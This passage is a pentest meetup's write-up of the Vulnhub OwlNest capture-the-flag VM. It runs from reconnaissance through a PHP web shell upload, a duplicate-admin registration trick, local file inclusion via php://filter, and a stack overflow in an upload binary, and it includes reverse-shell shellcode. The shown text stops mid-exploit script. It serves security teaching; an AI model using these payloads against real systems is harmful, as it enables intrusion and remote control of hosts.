@@ -1,0 +1,1395 @@
+.. include:: /pentest_links.txt
+
+.. _OwlNest:
+
+*******
+OwlNest
+*******
+
+Setup
+=====
+
+This is to document the meetup's efforts responding to the challenge `Vulnhub OwlNest: 1.0.2 <https://www.vulnhub.com/entry/owlnest-102,102/>`_. This document owes much to two writeups. First `OwlNest Hacking Challenge <http://blog.techorganic.com/2014/09/10/owlnest-hacking-challenge/>`_:
+
+  This was debuted at ESC 2014 CTF where no one was able to solve it. It took me several days to finish off this beast after getting stuck in a tarpit, but this was a whole lot of fun.
+
+ And `Owl Up in My Grill <http://fourfourfourfour.co/2014/10/26/owl-up-in-my-grill/>`_:
+ 
+   I was, however, not expecting it to take me 4 days…
+
+The point is that this is a comparatively difficult challenge and our writeup will attempt to fill in enough details to allow stepping through the exercise in a few hours.
+
+
+Setting up the VM
+-----------------
+
+The VM comes packaged as the ova file `OwlNest_v1.0.2.ova <http://download.vulnhub.com/owlnest/OwlNest_v1.0.2.ova>`_ running Debian 7 (Wheezy).
+
+Setting up your environment
+---------------------------
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/owlnest
+  mkdir -p $PT
+  cd $PT
+  # download owlnest_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/owlnest_setup.sh
+  # edit as needed; later the recon will give you TARGET IPs
+  source owlnest_setup.sh
+
+The source for :file:`owlnest_setup.sh` (:download:`owlnest_setup.sh`) should look something like the following.
+
+.. literalinclude:: owlnest_setup.sh
+   :language: bash
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+The result is we find the IP for owlnest: $TARGET. Update $PT/owlnest_setup.sh and also edit :file:`/etc/hosts` to add "owlnest.com" (``echo "$TARGET owlnest.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running the above reveals:
+
+.. code-block:: console
+  :emphasize-lines: 1-3,5-6,8,10,15,17
+
+  PORT      STATE SERVICE REASON         VERSION
+  22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+  80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Debian))
+  |_http-methods: No Allow or Public header in OPTIONS response (status code 302)
+  |_http-server-header: Apache/2.2.22 (Debian)
+  | http-title: Site doesn't have a title (text/html).
+  |_Requested resource was /login_form.php
+  111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
+  | rpcinfo: 
+  |   program version   port/proto  service
+  |   100000  2,3,4        111/tcp  rpcbind
+  |   100000  2,3,4        111/udp  rpcbind
+  |   100024  1          55737/udp  status
+  |_  100024  1          56935/tcp  status
+  31337/tcp open  Elite?  syn-ack ttl 64
+
+  OS details: Linux 3.2, Linux 3.2 - 3.13
+
+Reconnaissance on port 22
+-------------------------
+
+``ssh root@owlnest.com`` accepted a password attempt so might be used to brute-force discovered user id passwords.
+
+Reconnaissance on port 31337
+----------------------------
+
+We try :program:`socat` on port 31337 ("eleet"):
+
+.. code-block:: console
+
+  hacker@kali:~/pentest/owlnest/exploit$ socat - TCP:owlnest.com:31337
+          (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
+          /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
+          \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
+         /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
+         \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
+     -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
+          \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
+
+  This is the OwlNest Administration console
+
+  Type Help for a list of available commands.
+
+  Ready: help
+
+  Syntax: command <argument>
+
+  help     This help
+  username   Specify your login name
+  password   Specify your password
+  privs   Specify your access level
+  login     login to shell with specified username and password
+
+We lack a user id and password to pursue this now, but undoubtedly it will surface again later.
+
+Reconnaissance on port 80
+-------------------------
+
+Standard HTTP reconnaissance:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/spider
+
+  dirb  http://$HOST/ -o dirb80_$HOST.txt
+  nikto -output nikto.html -C all -host $HOST -port 80
+
+Significant findings were:
+
+.. code-block:: console
+  :emphasize-lines: 2,6,8,9,14,16
+
+  ---- Scanning URL: http://owlnest.com/ ----
+  ==> DIRECTORY: http://owlnest.com/application/                                 
+  ==> DIRECTORY: http://owlnest.com/css/                                         
+  ==> DIRECTORY: http://owlnest.com/errors/                                      
+  ==> DIRECTORY: http://owlnest.com/fonts/                                       
+  ==> DIRECTORY: http://owlnest.com/forms/                                       
+  ==> DIRECTORY: http://owlnest.com/graphics/                                    
+  ==> DIRECTORY: http://owlnest.com/images/                                      
+  ==> DIRECTORY: http://owlnest.com/includes/                                    
+  + http://owlnest.com/index.php (CODE:302|SIZE:1750)                            
+  ==> DIRECTORY: http://owlnest.com/js/                                          
+  ==> DIRECTORY: http://owlnest.com/pictures/                                    
+  + http://owlnest.com/server-status (CODE:403|SIZE:292)                         
+  + http://owlnest.com/application/upload (CODE:200|SIZE:190)                    
+
+  + Root page / redirects to: /login_form.php
+
+Browsing port 80
+----------------
+
+Reconnaissance without a user id
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Visiting http://owlnest.com/ redirects to `Welcome to the OwlNest <http://owlnest.com/login_form.php>`_. But that need not stop you from doing lots of reconnaissance; there all the :program:`dirb`-found directories could be browsed, outside http://owlnest.com/ which redirected to the `Welcome to the OwlNest <http://owlnest.com/login_form.php>`_ login/registration page.
+
+Uploading files without a user id
+"""""""""""""""""""""""""""""""""
+
+Selecting http://owlnest.com/forms/form.php brings ups an upload form showing the web server root directory is :file:`/var/www/`. If you actually fill out the form you can upload arbitrary files and a little investigation finds them at http://owlnest.com/images/, however you don't have permissions to fetch them:
+
+.. code-block:: bash
+  :emphasize-lines: 5-7,9-10,15-16,24-25,33,37,40,43
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  # Create PHP to execute arbitrary shell commands
+  echo '<?php passthru($_GET["cmd"]); ?>' > x.php
+  cp x.php x.php.jpg
+
+  # Upload without credentials
+  URL='http://owlnest.com/application/upload'
+  NAME='Exploit'
+  EMAIL='pentest-meetup@bitbender.org'
+  DESCRIPTION='Sample Upload'
+
+  # First upload x.php
+  UPLOADFIELD='@x.php'
+  curl --silent \
+    --form "name=$NAME"  \
+    --form "email=$EMAIL" \
+    --form "description=$DESCRIPTION" \
+    --form "uploadfield=$UPLOADFIELD" \
+    $URL
+
+  # Then upload x.php.jpg
+  UPLOADFIELD='@x.php.jpg'
+  curl --silent \
+    --form "name=$NAME"  \
+    --form "email=$EMAIL" \
+    --form "description=$DESCRIPTION" \
+    --form "uploadfield=$UPLOADFIELD" \
+    $URL
+
+  # See that they are uploaded
+  curl --silent http://owlnest.com/images/ \
+    | grep 'x.php' | sed 's/.*>x.php/x.php/;s/<.*//'
+
+  # But you can't fetch them
+  curl --silent http://owlnest.com/images/x.php
+  # results in
+  # Unknown: failed to open stream: Permission denied
+  curl --silent http://owlnest.com/images/x.php.jpg
+  # results in
+  # 403 Forbidden
+
+Note that ``curl --form ...`` hides all that message file upload POST_DATA creation. Here is what the actual POST_DATA looks like (courtesy of `Tamper Data`_ and an editor showing "\\r\\n"):
+
+.. code-block:: text
+
+  'POST_DATA=-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name="name"\r\n\r\nname\r\n-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name="email"\r\n\r\nemail@email.com\r\n-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name="description"\r\n\r\ndescription\r\n-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name="uploadfield"; filename="x.php"\r\nContent-Type: application/x-php\r\n\r\n<?php passthru($_GET["cmd"]); ?>\n\r\n-----------------------------1600898376930139461407304265--\r\n'
+
+To see the POST_DATA using curl, use ``curl --trace-ascii /dev/stdout ...`` or (if you want to see the "\\r\\n" line endings) ``curl --trace /dev/stdout ...``), both without the ``-v`` option (which will override the trace option).
+
+:file:`application/upload` looks interesting but currently inaccessible:
+
+.. code-block:: bash
+  :emphasize-lines: 1,13
+
+  curl http://owlnest.com/application/upload
+  # results in
+  #  / ___  ___ \
+  # / / @ \/ @ \ \
+  # \ \___/\___/ /\
+  #  \____\/____/||
+  #  /     /\\\\\//
+  #  |     |\\\\\\
+  #   \      \\\\\\
+  #    \______/\\\\
+  #     _||_||_
+  #      -- --
+  # you gotta be kidding me, right?
+
+Now there's something to remember for later.
+
+Registering a new user id
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+It's time to register a user id to see if more reconnaissance is possible. Visit http://owlnest.com/login_form.php and then click on `Register a new account <http://owlnest.com/register_form.php>`_ to get `Owlnest Registration <http://owlnest.com/register_form.php>`_. This is where the curious will not pass by something that is significant for later exploitation - the limits on the input fields. One limit is that the :guilabel:`Login Name:` is at most 16 characters:
+
+.. code-block:: html
+  :emphasize-lines: 4
+
+  <div class="form-group">
+    <label for="nome" class="col-sm-2 col-lg-2 control-label">Login Name:</label>
+    <div class="col-sm-5 col-lg-5">
+      <input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
+    </div>
+  </div>
+
+This will be very important later, when we discover that we desperately need to run as user "admin". But for now we just note that limitation.
+
+Here's the :program:`curl` equivalent to register a new account. This first one will fail as "admin" already exists:
+
+.. code-block:: bash
+  :emphasize-lines: 5-7,9,13,17-18,20,25,29-33,35-42,44-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  # Creating admin user fails
+  URL=http://owlnest.com/register.php
+  rm -f $COOKIES
+
+  curl --silent \
+    --data-urlencode name=admin \
+    --data-urlencode surname=admin \
+    --data-urlencode email=admin@owlnest.com \
+    --data-urlencode username="admin" \
+    --data-urlencode password=admin \
+    --data-urlencode confirmpwd=admin \
+    $URL
+  # results in
+  # Username Already Exists
+
+  # Create hacker id with password "hacker"
+  curl --silent \
+    --data-urlencode name=hacker \
+    --data-urlencode surname=hacker \
+    --data-urlencode email=hacker@owlnest.com \
+    --data-urlencode username="hacker" \
+    --data-urlencode password=hacker \
+    --data-urlencode confirmpwd=hacker \
+    $URL
+  # results in
+  # Registration completed successfully
+  # For future reference, to create a second "admin":
+  #   make ID longer than 16 characters
+  #   --data-urlencode username="admin           1"
+
+  # Now log in using hacker/hacker
+  URL='http://owlnest.com/login.php'
+  curl --silent --cookie-jar $COOKIES \
+    --data-urlencode "username=hacker" \
+    --data-urlencode "password=hacker" \
+    $URL
+  # results in
+  # Successfully Logged in
+
+  # Show cookies
+  cat $COOKIES
+  # results in
+  # PHPSESSID=n9mrsaun6a17ipv32sac5acvs7
+
+The upload URL
+^^^^^^^^^^^^^^
+
+At this point trying the `Upload <http://owlnest.com/uploadform.php?page=forms/form.php>`_ link gets a message *The administrator has configured access restrictions for this page, only the user "admin" is allowed to view it.* But investigating the link http://owlnest.com/uploadform.php?page=forms/form.php leads one to wonder if LFI (local file inclusion) is possible:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  curl --location --cookie $COOKIES \
+      http://owlnest.com/uploadform.php?page=/etc/passwd
+  # results in
+  # The administrator has configured access restrictions for this page,
+  # only the user "admin" is allowed to view it.
+
+Nothing here without being "admin".
+
+Oh to be admin
+^^^^^^^^^^^^^^
+
+Most systems have both textual and internal names for a user, like "root" and UID 0 in Linux. The internal name is what matters. But here they want a user with textual name "admin". It would seem we're reduced to guessing admin's password. But a flaw in the registration allows creating a second admin user by exploiting the 16 character limit in `Owlnest Registration <http://owlnest.com/register_form.php>`_. Make a 17 byte username consisting of "admin" followed by 11 spaces followed by "1" (using :program:`curl` or `Tamper Data`_ to avoid the 16 byte form limit). When the 17 byte username is compared to the existing "admin" it's not the same and so is created (but probably only the first 16 bytes are stored). So now we have 2 "admin" accounts with different passwords.
+
+.. code-block:: bash
+  :emphasize-lines: 5-7,9,13,17-18,20,26-27,29-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  URL=http://owlnest.com/register.php
+  COOKIES=cookies.txt
+  rm -f $COOKIES
+
+  curl --silent \
+    --data-urlencode name=admin \
+    --data-urlencode surname=admin \
+    --data-urlencode email=admin@owlnest.com \
+    --data-urlencode username="admin           1" \
+    --data-urlencode password=admin \
+    --data-urlencode confirmpwd=admin \
+    $URL
+  # results in
+  # Registration completed successfully
+
+  # Now log in using admin/admin
+  URL='http://owlnest.com/login.php'
+  curl --silent --cookie-jar $COOKIES \
+    --data-urlencode "username=admin" \
+    --data-urlencode "password=admin" \
+    $URL
+  # results in
+  # Successfully Logged in
+
+  # Show cookies
+  cat $COOKIES
+  # results in
+  # PHPSESSID=sr43ht67im4ui4gi2airvvbar0
+
+LFI works with "admin":
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  curl --location --cookie $COOKIES \
+      http://owlnest.com/uploadform.php?page=/etc/passwd
+  # results in
+  # rmp:x:1000:1000:rmp,,,:/home/rmp:/bin/bash
+  curl --location --cookie $COOKIES \
+      http://owlnest.com/uploadform.php?page=/etc/group
+  # results in nothing interesting
+
+We see the local Linux user "rmp" which will be used later.
+
+Reconnaissance via LFI and PHP protocol php://filter/
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+So the "admin" user gives us LFI for reconnaissance. We want to snoop around for both PHP and non-PHP files. As seen above with :file:`/etc/passwd`, non-PHP files can easily be downloaded, but there's an alternative using one of the PHP protocols "file://":
+
+.. code-block:: bash
+  :emphasize-lines: 8-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  # This works
+  curl --location --cookie $COOKIES \
+      http://owlnest.com/uploadform.php?page=/etc/group
+  # But using the file:// protocol also works:
+  curl --location --cookie $COOKIES \
+      http://owlnest.com/uploadform.php?page=file:///etc/group
+
+There are other protocols besides "file://". Another is "data://" where if it were enabled here we could upload data:
+
+.. code-block:: bash
+
+  curl --location --cookie $COOKIES \
+      http://owlnest.com/uploadform.php?page=data://<?php+passthru(id);+?>
+
+But unfortunately that would get the error message *data:// wrapper is disabled in the server configuration by allow_url_include=0*.
+
+However, the PHP protocol "php://filter/" is enabled and will allow us to download PHP files, instead of executing them. From the list of all PHP `Supported Protocols and Wrappers <http://in.php.net/wrappers.php>`_ we only need the `php:// <http://in.php.net/manual/en/wrappers.php.php>`_ protocol, within that the ``php://filter`` wrapper, and within the `List of Available Filters <http://in.php.net/manual/en/filters.php>`_ we only need `base64_encode <http://in.php.net/manual/en/function.base64-encode.php>`_ from the `Conversion Filters <http://in.php.net/manual/en/filters.convert.php>`_. The idea is to base64-encode a PHP file so it's no longer PHP but something to be downloaded.
+
+Let's take a look at :file:`uploadform.php`:
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  URL='http://owlnest.com/uploadform.php'
+  PHP=uploadform.php
+  curl --silent --cookie $COOKIES \
+    $URL?page=php://filter/convert.base64-encode/resource=$PHP \
+    | base64 -d -w 0 \
+    | tee $PHP
+
+:file:`uploadform.php` source is:
+
+.. code-block:: php
+
+  <?php
+
+    include("includes/config_inc.php");
+
+          session_start();
+          if(isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true && base64_decode($_SESSION['username']) == "admin") {
+                  $loggedinas = urlencode(base64_decode($_SESSION['username']));
+          }
+          else {
+                  header("location: /error.php");
+      die();
+          }
+
+    include($_GET['page']);
+
+  ?>
+
+More LFI of both PHP and non-PHP files does not lead to a ready exploit.
+
+
+The Exploit
+===========
+
+On a side note, if you use :program:`curl` and dawdle, you may periodically have to log in again. Here goes a code snippet you can cut-&-paste to log back in as "admin":
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  # Now log in using admin/admin
+  URL='http://owlnest.com/login.php'
+  curl --silent --cookie-jar $COOKIES \
+    --data-urlencode "username=admin" \
+    --data-urlencode "password=admin" \
+    $URL
+  # results in
+  # Successfully Logged in
+
+Exploit :file:`upload` binary
+-----------------------------------------
+
+Download :file:`upload`
+^^^^^^^^^^^^^^^^^^^^^^^
+
+We return to :file:`application/upload` and download it and discover it's an ELF executable:
+
+.. code-block:: bash
+  :emphasize-lines: 6,7,9,10,12-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  URL='http://owlnest.com/uploadform.php'
+  APP=application/upload
+  FILE=upload
+  curl --silent --cookie $COOKIES \
+    $URL?page=php://filter/convert.base64-encode/resource=$APP \
+    | base64 -d -w 0 > $FILE
+
+  file upload
+  # results in
+  # upload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=c7d8af817263847d46ff91b7517e804674a970b2, not stripped
+
+Analyze :file:`upload`
+^^^^^^^^^^^^^^^^^^^^^^
+
+First a basic analysis of the statically linked :file:`upload` ELF (see `Enhance application security with FORTIFY_SOURCE <https://securityblog.redhat.com/2014/03/26/fortify-and-you/>`_). It has little to no security, allowing plain shellcode to be execute on the stack. Here we exercise a number of binutils utilities to look at :file:`upload`:
+
+.. code-block:: bash
+  :emphasize-lines: 5-9,14-19,21-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  P=upload
+  objdump -s --section .comment $P    # compiler?
+  ldd $P    # statically linked
+  readelf --segments $P    # ELF segments
+  readelf --sections $P    # ELF sections (contained in segments)
+  # Download checksec
+  curl --silent --remote-name \
+      https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec
+  chmod +x checksec
+  ./checksec --file $P
+  # results in
+  # No RELRO, No canary found, NX disabled, No PIE, No RPATH, No RUNPATH, FORTIFY Yes
+  ./checksec --fortify-file $P
+  # results in
+  # 4/58 FORTIFIED syslog_chk, vfprintf_chk, vfprintf_chk, vsyslog_chk
+
+  # Get a smallish list of 83 symbols for analysis
+  nm -g $P | grep -v ' _' | grep ' T ' | cut -d" " -f3 \
+      | sort | tee ${P}_symbols.txt
+  # show libc version on Kali
+  ldd --version
+  # results in 2.19
+  # Get symbols in 32 bit libc
+  nm -D /lib32/libc-2.19.so | grep -v ' _' | grep ' T ' | cut -d" " -f3 \
+      | sort | tee ${P}_libc.txt
+  # List symbols only in $P
+  comm -23 upload_symbols.txt upload_libc.txt > upload_uniq.txt
+  # results in 38 routines
+
+That last bit of ``nm`` and ``comm`` magic left us with the symbols in :file:`upload` not in libc. Of the 38 routines left, 20 are CGI_* which look to be from `cgic: an ANSI C library for CGI Programming <http://www.boutell.com/cgic/>`_ with source code hosted at github `boutell/cgic <https://github.com/boutell/cgic>`_. Of the 18 remaining, the only ones not C/C++ were "main" and "validateEmail". Unless we're going after known library bugs, we can concentrate our efforts on "main" and "validateEmail". And since "validateEmail" is much smaller, we'll start with that one.
+
+Disassemble :file:`upload`
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+To scan for possibly vulnerable code we can look at the dissassembled code, concentrating first on "validateEmail":
+
+.. code-block:: objdump
+  :emphasize-lines: 1-7,40-41
+
+  # validateEmail uses address 0x80ae908 so see that it's "@"
+  gdb -batch -ex 'file upload' -ex 'x/s 0x80ae908'
+  # results in
+  # 0x80ae908:  "@"
+  gdb -batch -ex 'file upload' -ex 'disassemble validateEmail'
+  # ARG1, ... is for validateEmail args
+  # arg1, ... is for called routine args
+  Dump of assembler code for function validateEmail:
+     0x08048254 <+0>:   push   ebp
+     0x08048255 <+1>:   mov    ebp,esp                        # save caller ebp
+     0x08048257 <+3>:   sub    esp,0x128                      # 296 byte stack
+     0x0804825d <+9>:   mov    eax,DWORD PTR [ebp+0x8]        # arg1=ARG1
+     0x08048260 <+12>:  mov    DWORD PTR [esp],eax            #
+     0x08048263 <+15>:  call   0x8059080 <strlen>             # strlen(arg1)
+     0x08048268 <+20>:  add    eax,0x1                        # eax = strlen+1
+     0x0804826b <+23>:  mov    DWORD PTR [esp],eax            # arg1 = strlen+1
+     0x0804826e <+26>:  call   0x80575c0 <malloc>             # malloc(arg1)
+     0x08048273 <+31>:  mov    DWORD PTR [ebp-0xc],eax        # save malloc
+     0x08048276 <+34>:  mov    eax,DWORD PTR [ebp+0x8]        # arg2=ARG1
+     0x08048279 <+37>:  mov    DWORD PTR [esp+0x4],eax        #
+     0x0804827d <+41>:  mov    eax,DWORD PTR [ebp-0xc]        # arg1=malloc
+     0x08048280 <+44>:  mov    DWORD PTR [esp],eax            #
+     0x08048283 <+47>:  call   0x8059050 <strcpy>             # strcpy(malloc,ARG1)
+     0x08048288 <+52>:  mov    DWORD PTR [esp+0x4],0x80ae908  # arg2="@"
+     0x08048290 <+60>:  mov    eax,DWORD PTR [ebp-0xc]        # arg1=malloc
+     0x08048293 <+63>:  mov    DWORD PTR [esp],eax            #
+     0x08048296 <+66>:  call   0x8059c40 <strtok>             # strtok(malloc,"@")
+     0x0804829b <+71>:  mov    DWORD PTR [ebp-0x10],eax       # save strtok PTR
+     0x0804829e <+74>:  mov    DWORD PTR [esp+0x4],0x80ae908  # arg2="@"
+     0x080482a6 <+82>:  mov    DWORD PTR [esp],0x0            # arg1=0x0
+     0x080482ad <+89>:  call   0x8059c40 <strtok>             # strtok(0x0,"@")
+     0x080482b2 <+94>:  mov    DWORD PTR [ebp-0x10],eax       # save strtok PTR
+     
+     0x080482b5 <+97>:  cmp    DWORD PTR [ebp-0x10],0x0       # last strtok = 0x0?
+     0x080482b9 <+101>: je     0x80482d0 <validateEmail+124>  # yes - skip
+     0x080482bb <+103>: mov    eax,DWORD PTR [ebp-0x10]       # no - arg2=strtok PTR
+     0x080482be <+106>: mov    DWORD PTR [esp+0x4],eax        #
+     0x080482c2 <+110>: lea    eax,[ebp-0x110]                # no - arg1=272 bytes
+     0x080482c8 <+116>: mov    DWORD PTR [esp],eax            #      from stack top
+     0x080482cb <+119>: call   0x8059050 <strcpy>             # strcpy(STACK,strtok PTR)
+                                                              #   STACK OVERFLOW HERE
+     0x080482d0 <+124>: mov    eax,0x0                        # return 0
+     0x080482d5 <+129>: leave  
+     0x080482d6 <+130>: ret    
+
+We could paraphrase this code as:
+
+.. code-block:: c
+  :emphasize-lines: 9-
+
+  int validateEmail(char* email)
+    // allocate buffer big enough for email copy
+    buffer = malloc(strlen(email)+1)
+    strcpy(buffer, email)
+    // Find string before "@" in email
+    user = strtok(buffer, "@")
+    // Find string after "@"
+    domain = strtok(0x0, "@")
+    // if domain exists make a useless copy in the stack
+    //   which will overflow if bigger than 272 bytes
+    if (domain != 0x0) {
+      strcpy(PTR_272_BYTES_INTO_STACK, domain)
+    }
+
+That last ``strcpy`` is useless and overflows the stack. But we wouldn't have an exploit without it. So the first 272 bytes of the email's domain fills up the stack, the next 4 bytes clobbers the saved caller's ebp pointer, and the next 4 overwrite the return address.
+
+Running :file:`upload` on the command line
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If you look at the Tamper Data capture of the form in `The OwlNest Upload <http://owlnest.com/uploadform.php?page=forms/form.php>`_, it specifies "Content-Type" and "POSTDATA". How does `cgic.c <https://github.com/boutell/cgic/blob/master/cgic.c>`_ get those data? For "Content-Type" via ``e = getenv("CONTENT_TYPE");`` which fetches the environment variable CONTENT_TYPE. That specifies the boundary between fields in the "multipart/form-data", allowing CGI to parse the posted form. The "POSTDATA" is read from STDIN, as seen from the line ``cgiIn = stdin;`` and numerous ``fread(,,,cgiIn)`` reads.
+
+File uploads are stored in :file:`/var/www/images/`. Putting this all together, to run :file:`upload` from the command line using a domain large enough to overflow the buffer and overwrite the return address with "BBBB":
+
+.. code-block:: bash
+  :emphasize-lines: 5-9,11-14,22,28,35,38,42
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  # /var/www not exist on my machine
+  ls -ld /var/www
+  # So create /var/www/images for my user
+  $SUDO mkdir -p /var/www/images
+  $SUDO chown $USER.$USER /var/www/images
+
+  CONTENT_TYPE='multipart/form-data; boundary=---------------------------1802089588215914701439635166' ./upload < request.txt
+  FILENAME='foo.txt'
+  DOMAIN=$(python -c 'print "A"*276 + "BBBB"')
+  cat > request.txt <<EOF
+  -----------------------------1802089588215914701439635166
+  Content-Disposition: form-data; name="name"
+
+  name
+  -----------------------------1802089588215914701439635166
+  Content-Disposition: form-data; name="email"
+
+  user@$DOMAIN
+  -----------------------------1802089588215914701439635166
+  Content-Disposition: form-data; name="description"
+
+  description
+  -----------------------------1802089588215914701439635166
+  Content-Disposition: form-data; name="uploadfield"; filename="$FILENAME"
+  Content-Type: text/plain
+
+  foo foo foo
+
+  -----------------------------1802089588215914701439635166--
+  EOF
+  unix2dos request.txt
+
+  unset QUERY_DATA
+  CONTENT_TYPE="$CONTENT_TYPE" ./upload < request.txt
+  ls -la /var/www/images
+  dmesg | tail -n 1
+  # results in
+  # [ 7718.408449] upload[1921]: segfault at 42424242 ip 0000000042424242 sp 00000000ffe5e7a0 error 14
+
+You can see segfault at 42424242 or 4 B's; we nailed the return address. So now all we need is a shellcode exploit that returns a reverse shell to us.
+
+Since the :file:`/var/www` directory did not exist on my host I'll remove it here via ``$SUDO rm -rf /var/www``.
+
+
+Generate & start reverse shell for :file:`upload`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Generate the shellcode
+""""""""""""""""""""""
+
+We're looking for a reverse shell shellcode. There are 2 equivalent ways of generating the shellcode. Select a shellcode from `Shellcodes database for study cases <http://shell-storm.org/shellcode/>`_. You would hand-edit the shellcode to reflect the reverse target's ip/port. Another way is to use gdb with `longld/peda <https://github.com/longld/peda>`_ (follow link for installation instructions) to generate the reverse shellcode. Here is the :program:`gdb` command using :program:`peda`'s shellcode generator:
+
+.. code-block:: bash
+  :emphasize-lines: 5
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  gdb -batch -ex "shellcode generate x86/linux connect $PORT $KALI"
+
+Running this gives:
+
+.. code-block:: python
+
+  # x86/linux/connect: 70 bytes
+  # port=4444, host=192.168.1.28
+  shellcode = (
+      "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
+      "\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x01\x1c\x66\x68"
+      "\x11\x5c\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
+      "\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
+      "\x89\xe1\xb0\x0b\xcd\x80" )
+
+We'll assume the owlnest.com machine has ASLR on, so we'll also need the address of a ``jmp esp`` instruction (so we are independent of the stack location):
+
+.. code-block:: bash
+  :emphasize-lines: 5-
+
+  PT=$HOME/pentest/owlnest
+  source $PT/owlnest_setup.sh
+  cd $PT/exploit
+
+  objdump -M intel -D upload | grep jmp | grep esp
+  # returns (only first one shown)
+  #  80c75ab:  ff e4                  jmp    esp
+
+
+Add the shellcode to the request
+""""""""""""""""""""""""""""""""
+
+To avoid ASLR, we'll overwrite the return address (bytes 277-280) with the address of a ``jmp esp`` instruction. So our email domain will look something like: "276 bytes of NOP instructions" + "jmp esp" + "shellcode". So when the validateEmail routine returns, the return address has the address of ``jmp esp`` stored there, so execution picks up with the shellcode. Note that if the shellcode itself needed the stack for computations, we would insert an instruction between "jmp esp" & "shellcode" to subtract a big enough number from esp to move the stack beyond the shell code.
+
+Copy the following python script to ``request.py``, **changing the shellcode assignment to the one you generated**:
+
+.. code-block:: python
+  :emphasize-lines: 5-13
+
+  #!/usr/bin/env python
+
+  from struct import pack
+
+  # vvvvvvvvvvvvvvvvvvvvv CHANGE TO YOUR SHELLCODE vvvvvvvvvvvvvvvvvvvvv
+  # gdb -batch -ex "shellcode generate x86/linux connect  $PORT $KALI"
+  shellcode = (
+      "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
+      "\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\x01\x1c\x66\x68"
